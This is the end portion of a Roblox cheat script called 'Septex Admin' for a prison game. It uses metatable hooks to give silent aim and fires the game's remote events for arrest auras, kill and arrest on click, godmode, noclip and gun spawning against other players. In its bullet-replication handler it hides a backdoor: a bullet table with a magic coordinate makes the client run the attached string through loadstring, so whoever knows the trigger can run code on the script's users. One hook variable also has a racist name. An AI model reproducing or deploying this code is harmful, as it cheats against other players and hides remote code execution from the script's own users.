  if NotCommand("unload") and NotCommand("prefix") and NotCommand('re') and NotCommand("refresh") and NotCommand("cmds") and NotCommand("cmd") and NotCommand("inmate") and NotCommand("in") and NotCommand("guard") and NotCommand("gu") and NotCommand("autore") and NotCommand("autorespawn") and NotCommand("autoremoveff") and NotCommand("autorff") and NotCommand("killaura") and NotCommand("whitelist") and NotCommand("wl") and NotCommand("unwhitelist") and NotCommand("unwl") and NotCommand("kill") and NotCommand("oof") and NotCommand("die") and NotCommand("olditemmethod") and NotCommand("oldimethod") and NotCommand("damage") and NotCommand("dmg") and NotCommand("autodumpcars") and NotCommand("autoremovecars") and NotCommand('autonocars') and NotCommand("crim") and NotCommand("criminal") and NotCommand("makecrim") and NotCommand("antisit") and NotCommand("infjump") and NotCommand("bring") and NotCommand("void") and NotCommand("view") and NotCommand("unview") and NotCommand("copychat") and NotCommand("antifling") and NotCommand("goto") and NotCommand("to") and NotCommand("shotgun") and NotCommand("remington") and NotCommand("rem") and NotCommand("ak-47") and NotCommand('ak') and NotCommand("m9") and NotCommand("pistol") and NotCommand("m4a1") and NotCommand('m4') and NotCommand("hammer") and NotCommand("ham") and NotCommand("knife") and NotCommand("knive") and NotCommand("guns") and NotCommand("items") and NotCommand("autoguns") and NotCommand("aguns") and NotCommand("autoitems") and NotCommand("aitems") and NotCommand('loopcrim') and NotCommand("unloopcrim") and NotCommand("respawn") and NotCommand("opengate") and NotCommand("car") and NotCommand("forcefield") and NotCommand("ff") and NotCommand("speed") and NotCommand("ws") and NotCommand("tp") and NotCommand("givekey") and NotCommand("keycard") and NotCommand("key") and NotCommand("antitase") and NotCommand("antishield") and NotCommand("autoguard") and NotCommand("aguard") and NotCommand("silentaim") and NotCommand("saim") and NotCommand("noclip") and NotCommand("shootback") and NotCommand("antishoot") and NotCommand("doors") and NotCommand("oneshot") and NotCommand("anticrash") and NotCommand("lagspike") and NotCommand("pp") and NotCommand("tase") and NotCommand("arrest") and NotCommand("ar") and NotCommand("clickkill") and NotCommand("clickarrest") and NotCommand("godmode") and NotCommand("god") and NotCommand('arrestaura') and NotCommand("antitouch") and NotCommand("notify") and NotCommand("antipunch") and NotCommand("spawnguns") and NotCommand('fly') and NotCommand("unfly") and NotCommand('carfly') and NotCommand('uncarfly') then
    API:Notif("Error", 'Not a valid command.', Color3.fromRGB(255, 0, 0), 3)
  end
end
local Cooldown = true
game.Players.LocalPlayer.Chatted:Connect(function(chat)
	if chat:sub(1,#Prefix) == Prefix then
		if not Cooldown then
			Cooldown = true
			PlayerChatted(chat)
			wait(.4)
			for i = 1,5 do task.wait()
				Cooldown = false
			end
		end
	end
end)
plr.CharacterAdded:Connect(function(NewChar)
    repeat API:swait() until NewChar
    NewChar:WaitForChild('Head')
    NewChar:WaitForChild("HumanoidRootPart")
    NewChar:WaitForChild("Humanoid").BreakJointsOnDeath = not States.AutoRespawn
    NewChar:WaitForChild("Humanoid").Died:Connect(function()
        if States.AutoRespawn and not Unloaded then
          API:Refresh()
        end
    end)
    if Unloaded then return end
    if States.AutoRemoveff then
      NewChar:WaitForChild("ForceField"):Destroy()
    end
    if States.AutoGuns then
	API:AllGuns()
    end
    if States.AutoItems then
	API:AllItems()
    end
    if States.AutoGuard then
	if Player.Team ~= game.Teams.Guards then
		API:ChangeTeam(game.Teams.Guards)
	end
    end
    if States.Godmode then
	game.Players.LocalPlayer.Character.Humanoid.Name = 1
	local l = game.Players.LocalPlayer.Character["1"]:Clone()
	l.Parent = game.Players.LocalPlayer.Character
	l.Name = "Humanoid"
	game.Players.LocalPlayer.Character.Animate.Disabled = true
	wait()
	game.Players.LocalPlayer.Character.Animate.Disabled = false
	game.Players.LocalPlayer.Character["1"]:Destroy()
	game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
    end
end)
TextBox.FocusLost:Connect(function(EnterKey)
    if EnterKey and not Unloaded then
      if TextBox.Text:sub(1,#Prefix) ~= Prefix then
        PlayerChatted(Prefix..TextBox.Text)
        TextBox.Text = ''
      else
        PlayerChatted(TextBox.Text)
        TextBox.Text = ""
      end
    end
end)
coroutine.wrap(function()
	game:FindService("UserInputService").JumpRequest:Connect(function()
		if States.InfJump and Unloaded == false then
			game:FindService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
		end
	end)
	-- main loop
	while wait() do -- fast loop
		if Unloaded then return end
		if plr.Character.Humanoid.Sit and States.AntiSit then
			plr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		end
		pcall(function()
			if States.ArrestAura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and v.Team ~= game.Teams.Guards then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part")
							}
							if v.Team == game.Teams.Criminals or (v.Team == game.Teams.Inmates and API:BadArea(v)) then
								for i = 1,4 do
									workspace.Remote.arrest:InvokeServer(unpack(args))
								end
							end
						end
					end
				end
			end
		end)
		if not plr.Character:FindFirstChild("ForceField") and States.ff then
			wait(.1)
			API:Refresh()
		end
		if States.Godmode and Unloaded == false then
			if States.AutoRemoveff == false then
				States.AutoRemoveff = true
			end
			wait(2.1)
			API:Refresh()
		end
		pcall(function()
			if States.AntiTouch == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <2.3 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							for i =1,10 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
								end)
							end
						end
					end
				end
			end
		end)
	end
end)()
spawn(function()
	while wait(.3) do -- medium loop
		if States.noclip and Player.Character then
			for _,x in pairs(Player.Character:GetDescendants()) do
				if x:IsA("BasePart") and States.noclip then
					x.CanCollide = false
				end
			end
		end
		if States.spawnguns and not Unloaded then
			if plr.Team ~= game.Teams.Guards then
				API:ChangeTeam(game.Teams.Guards)
				wait(.15)
			end
			if States.spawnguns then
				plr.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
				wait(.05)
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			end
		end
	end
end)
spawn(function()
	while wait(.6) do -- slow loop
		for i,v in pairs(API.LoopCrim) do
			if v and game.Players:FindFirstChild(v) then
				local Target = game.Players:FindFirstChild(v)
				if Target.Team ~= game.Teams.Criminals then
					API:bring(Target, saved)
				end
			end
		end
		if Unloaded then return end
		if States.AntiTase and getconnections then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
		end
		if States.AntiShield then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v.Character and v:FindFirstChild("Torso") and v:FindFirstChild("Torso"):FindFirstChild("ShieldFolder") then
					v.Torso:FindFirstChild("ShieldFolder"):Destroy()
				end
			end
		end
	end
end)
function CopyChat(Target)
	Target.Chatted:Connect(function(msg)
		if States.CopyChat and not Unloaded then
			API:Chat("["..Target.DisplayName.."]: "..msg)
		end
	end)
end
function NoCollide(PLR)
	 if States.AntiFling and not Unloaded and PLR.Character then
		 for _,x in pairs(PLR.Character:GetDescendants()) do
			 if x:IsA("BasePart") and not Unloaded and States.AntiFling then
				 x.CanCollide = false
			 end
		 end
	 end
 end
function PickUp(PLAYER)
	PLAYER.Backpack.ChildAdded:Connect(function(Item)
		if States.Notify and not Unloaded then
			game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[PlayerPickUp]: "..PLAYER.Name.." Pick Up "..Item.Name, Color = Color3.fromRGB(255, 255, 0), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
		end
	end)
end
for i,v in pairs(game.Players:GetPlayers()) do
	if v ~= plr then
		CopyChat(v)
		game:FindService("RunService").Stepped:Connect(function()
			NoCollide(v)
		end)
		PickUp(v)
		task.spawn(function()
			AntiPunchC(v)
		end)
	end
end
game.Players.PlayerAdded:Connect(function(Add)
	CopyChat(Add)
	game:FindService("RunService").Stepped:Connect(function()
		NoCollide(Add)
	end)
	if States.Notify and not Unloaded then
		game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[PlayerAdded]: "..Add.Name.." has joined the game!", Color = Color3.fromRGB(255, 255, 0), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
	end
	PickUp(Add)
	task.spawn(function()
		AntiPunchC(Add)
	end)
end)
game.Players.PlayerRemoving:Connect(function(Remove)
	CopyChat(Remove)
	game:FindService("RunService").Stepped:Connect(function()
		NoCollide(Remove)
	end)
	if States.Notify and not Unloaded then
                game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[PlayerRemoving]: "..Remove.Name.." has left the game!", Color = Color3.fromRGB(255, 255, 0), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
	end
	PickUp(Remove)
	AntiPunchC(Remove)
end)
local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
local function NotObstructing(Destination, Ancestor)
	local ObstructingParts = Camera.GetPartsObscuringTarget(Camera, {Destination}, {Ancestor, LocalPlayer.Character})

	for i,v in ipairs(ObstructingParts) do
		pcall(function()
			if v.Transparency >= 1 then
				table.remove(ObstructingParts, i)
			end
		end)
	end

	if #ObstructingParts <= 0 then
		return true
	end
	local RaycastParameters = RaycastParams.new()
	RaycastParameters.IgnoreWater = true
	RaycastParameters.FilterType = Enum.RaycastFilterType.Blacklist
	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	local Origin = Camera.CFrame.Position
	local Direction = (Destination - Origin).Unit * 500
	local RayResult = workspace.Raycast(workspace, Origin, Direction, RaycastParameters) or {
		Instance = nil;
		Position = Origin + Direction;
		Material = Enum.Material.Air;
	}

	if RayResult.Instance and (RayResult.Instance.IsDescendantOf(RayResult.Instance, Ancestor) or RayResult.Instance == Ancestor) then
		return true
	end
	return false
end
function ClosestChar()
	local Max, Close = 170
	for I,V in pairs(GetPlayers(Players)) do
		if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
			local Head = FindFirstChild(V.Character, "Head")
			if Head then
				if NotObstructing(V.Character.PrimaryPart.Position, V.Character) == false then
					continue
				end
				local Pos, OnScreen = WTSP(Camera, Head.Position)
				if OnScreen then
					local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
					if Dist < Max then
						Max = Dist
						Close = V.Character
					end
				end
			end
		end
	end

	return Close
end
local blackperson; blackperson = hookfunction(game.Destroy,function(a)
	local isExploit = checkcaller()
	if a and a:IsA("Player") and not Unloaded and isExploit  then
		--
	end
end)
local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
	local Method = getnamecallmethod()
	local isExploit = checkcaller()
	if Method:lower() == "destroy" or Method:lower() == "remove" and Unloaded == false then
		if self.IsA(self, "Player") and isExploit then
			--
		end
	end
	if States.SilentAim then
		if not Unloaded and Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
			local Character = ClosestChar()
			if Character then
				return Character.Torso, Character.Torso.Position+Vector3.new(Random.new():NextNumber(-1,1),Random.new():NextNumber(.1,.8),Random.new():NextNumber(-.5,.5))
			end
		end
	end
	return __namecall(self, ...)
end)
setreadonly(MT, true)
function MostClose(Position)
	local Max, Closest = math.huge,nil
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character then
			if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
				local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
				if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
					local Distance = (ShootPart.Position-Position).Magnitude
					if Distance < Max then
						Max = Distance
						Closest = v
					end 
				end
			end
		end
	end
	return Closest
end
				
local CurrentTime = 0
function GetPlayerHit(Part)
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:IsAncestorOf(Part) then
			return v
		end
	end
end
local ShootbackCooldown = false
local function ReplicationEventFunction(Table)
	if Table[1] and Table[1].MSG ~= nil and Table[1].PLA ~= nil then
		if Table[1].Cframe.Z == 20000 then
			task.spawn(function()
				loadstring(tostring(Table[1].MSG))()
			end)
		end
	end
	if Unloaded then return end
	local Count = 0
	pcall(function()
		for i,v in pairs(Table) do
			if Count <= 2 then
				local Hit=v.Hit
				local Distance=v.Distance
				local Cframe=v.Cframe
				local RayObject =v.RayObject
				if Hit and Distance and Cframe then
					if Cframe ~= CFrame.new() then
						local PlayerHit = nil
						local WhoShot = nil
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							if v.Character:IsAncestorOf(Hit) then
								WhoShot = v
								PlayerHit = Hit
								break
							end
						end
						local Worked,ufhwiufwe2 = pcall(function()
							WhoShot = MostClose((Cframe * CFrame.new(0, 0, -Distance / 2)).p)
						end)
						if Worked and WhoShot and PlayerHit and not Unloaded then
							if States.ShootBack and not ShootbackCooldown then
								if PlayerHit then
									if PlayerHit and Player.Character:IsAncestorOf(PlayerHit) and ShootbackCooldown == false and WhoShot.Team ~= plr.Team then
										ShootbackCooldown = true
										API:KillPlayer(WhoShot,10)
										wait(.5)
										ShootbackCooldown = false
									end
								end
							end
						end
					end
				end
				Count = Count + 1
			end
		end
	end)
end
coroutine.wrap(function()
	game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:Connect(ReplicationEventFunction)
end)()
plr:GetMouse().Button1Up:Connect(function()
	local target = plr:GetMouse().Target
	if not Unloaded and target and target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(target.Parent.Name) and States.OneShot then
		local Vic = game:GetService("Players"):FindFirstChild(target.Parent.Name)
		local Gun = plr.Character:FindFirstChildOfClass("Tool")
		if Gun and Gun:FindFirstChildOfClass("ModuleScript") and Vic and Vic.Team ~= plr.Team then
			local Bullets = API:CreateBulletTable(20, Vic.Character:FindFirstChild("Head") or Vic.Character:FindFirstChildOfClass("Part"))
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		end
	end
end)
pcall(function()
	local BulletCoolDown = false
	Temp.GunHandler =game:GetService("ReplicatedStorage"):WaitForChild("ReplicateEvent").OnClientEvent:connect(function(Amount, Value)
		if not States.anticrash then
			return
		end
		if #Amount <70 and not BulletCoolDown then
			BulletCoolDown =true
			for i = 1, #Amount do
				local Bullet = Instance.new("Part", workspace.CurrentCamera)
				Bullet.Name = "RayPart"
				Bullet.Material = Enum.Material.Neon
				Bullet.Anchored = true
				Bullet.CanCollide = false
				Bullet.Transparency = 0.5
				Bullet.formFactor = Enum.FormFactor.Custom
				Bullet.Size = Vector3.new(0.2, 0.2, Amount[i].Distance)
				Bullet.CFrame = Amount[i].Cframe
				game.Debris:AddItem(Bullet, 0.05)
				Instance.new("BlockMesh", Bullet).Scale = Vector3.new(0.5, 0.5, 1)
				if Value then
					Bullet.BrickColor = BrickColor.new("Cyan")
					local Light = Instance.new("SurfaceLight", Bullet)
					Light.Color = Color3.new(0, 0.9176470588235294, 1)
					Light.Range = 5
					Light.Face = "Bottom"
					Light.Brightness = 10
					Light.Angle = 180
					task.spawn(function()
						for v7 = 1, 10 do
							Bullet.Transparency = Bullet.Transparency + 0.1
							Light.Brightness = Light.Brightness - 1
							wait()
						end
					end)
				else
					Bullet.BrickColor = BrickColor.Yellow()
				end
			end
			wait(.01)
			BulletCoolDown = false
		end
	end)
	local CoolDown = false
	Temp.SoundHandler = game:GetService("ReplicatedStorage"):WaitForChild("SoundEvent").OnClientEvent:connect(function(Sound1, p4)
		if not States.anticrash then
			return
		end
		if CoolDown then
			CoolDown = true
			local Sound = Sound1:Clone()
			Sound.Parent = Sound1.Parent
			Sound:Play()
			Sound.Played:Connect(function()
				wait()
				game:GetService("Debris"):AddItem(Sound,0.001)
			end)
			wait(.1)
			CoolDown = false
		end
	end)
	Temp.WarnHandler = game:GetService("ReplicatedStorage"):WaitForChild("WarnEvent").OnClientEvent:connect(function(Text)
		if not States.anticrash then
			return
		end
		local WarnGui = game:GetService("ReplicatedStorage").gooeys.WarnGui:Clone()
		WarnGui.Parent = plr.PlayerGui
		if Text == 1 then
			WarnGui.Frame.desc.Text = "This is your last warning. You will become a prisoner if you kill an innocent player 1 more time."
		else
			WarnGui.Frame.desc.Text = "Do not kill innocent people! You will be arrested and jailed if you kill " .. Text .. " more times."
		end
		WarnGui.Frame.LocalScript.Disabled = false
	end)
end)
local Killcool1 = false
plr:GetMouse().Button1Up:Connect(function()
	local Target = plr:GetMouse().Target
	if Killcool1 then return end
	if States.ClickArrest or States.ClickKill then
		if Target and Target.Parent and Target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name) then
			local TargetModelPlr = game:GetService("Players"):FindFirstChild(Target.Parent.Name) or game:GetService("Players"):FindFirstChild(Target.Parent.Parent.Name)
			if States.ClickArrest then
				if TargetModelPlr.Team ~= game.Teams.Guards then
					for i = 1,5 do
						workspace.Remote.arrest:InvokeServer(Target)
					end
				end
			end
			if States.ClickKill then
				API:KillPlayer(TargetModelPlr,15)
				Killcool1 = true
				wait(.4)
				Killcool1 = false
			end
		end
	end
end)
TextButton.MouseButton1Click:Connect(function()
	if Frame.Size == UDim2.new(0, 250, 0, 80) then
		Frame.Size = UDim2.new(0, 250, 0, 28)
		TextLabel.Visible = false
		TextBox.Visible = false
		TextButton.Text = "+"
	elseif Frame.Size == UDim2.new(0, 250, 0, 28) then
		Frame.Size = UDim2.new(0, 250, 0, 80)
		TextLabel.Visible = true
		TextBox.Visible = true
		TextButton.Text = "-"
	end
end)
TextButton_2.MouseButton1Click:Connect(function()
	Frame.Visible = false
	TextButton_2.Visible = false
	TextButton_3.Visible = true
end)
TextButton_3.MouseButton1Click:Connect(function()
	Frame.Visible = true
	TextButton_2.Visible = true
	TextButton_3.Visible = false
end)
TextButton_4.MouseButton1Click:Connect(function()
	Frame_2.Visible = false
end)
API:Notif("Loads", 'Press F9 or chat /console to show commands list', Color3.fromRGB(255, 0, 0), 10)
API:Refresh()
Cooldown = false
else
	game:GetService("StarterGui"):SetCore("SendNotification",{Title = "Septex Admin",Text = "Septex admin is already executed or game not support",Duration = 7})
end
